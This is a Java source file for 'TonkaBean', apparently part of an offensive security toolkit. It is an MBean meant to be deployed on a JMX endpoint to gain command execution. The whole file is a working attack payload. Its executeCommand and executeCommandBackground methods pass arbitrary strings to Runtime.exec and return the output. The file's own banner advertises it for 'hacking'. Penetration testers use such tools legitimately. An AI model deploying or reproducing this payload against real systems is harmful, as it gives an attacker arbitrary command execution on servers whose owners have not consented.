package de.qtc.tonkabean;

import java.io.*;
 
public class TonkaBean implements TonkaBeanMBean {

    public static void main(String[] argv) {
      System.out.println("[+] Hi! I'm the tonka-bean.");
      System.out.println("[+] Deploy me on a JMX endpoint to obtain command execution.");
      System.out.println("[+]");
      System.out.println("[+] Available methods are:");
      System.out.println("[+]");
      System.out.println("[+] \tpublic String ping()");
      System.out.println("[+] \t\tReturns the message 'Pong!'");
      System.out.println("[+]");
      System.out.println("[+] \tpublic String executeCommand(String command)");
      System.out.println("[+] \t\tExecutes 'command' and returns the response");
      System.out.println("[+]");
      System.out.println("[+] \tpublic String executeCommandBackground(String command)");
      System.out.println("[+] \t\tExecutes 'command' in the background and returns status message");
      System.out.println("[+]");
      System.out.println("[+] Happy hacking :D");
    }

    public String executeCommand(String command) {
        try {
            Runtime runTime = Runtime.getRuntime();
            Process proc = runTime.exec(command);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            String stdout_err_data = "";
            String s;
            while ((s = stdInput.readLine()) != null) {
                stdout_err_data += s+"\n";
            }
            while ((s = stdError.readLine()) != null) {
                stdout_err_data += s+"\n";
            }
            proc.waitFor();
            return stdout_err_data;
        } catch (Exception e) {
            return e.toString();
        }
    }

    public String executeCommandBackground(String command) {
        try {
            Runtime runTime = Runtime.getRuntime();
            Process proc = runTime.exec(command);
        } catch (Exception e) {
            String errorResponse = "Failure while launching the command...\n";
            errorResponse = errorResponse + "The following exception was thrown:\n";
            errorResponse = errorResponse + e.toString();
            return e.toString();
        }
        return "Command was sucessfully launched";
    }

    public String ping() {
        return "Pong!";
    }
}
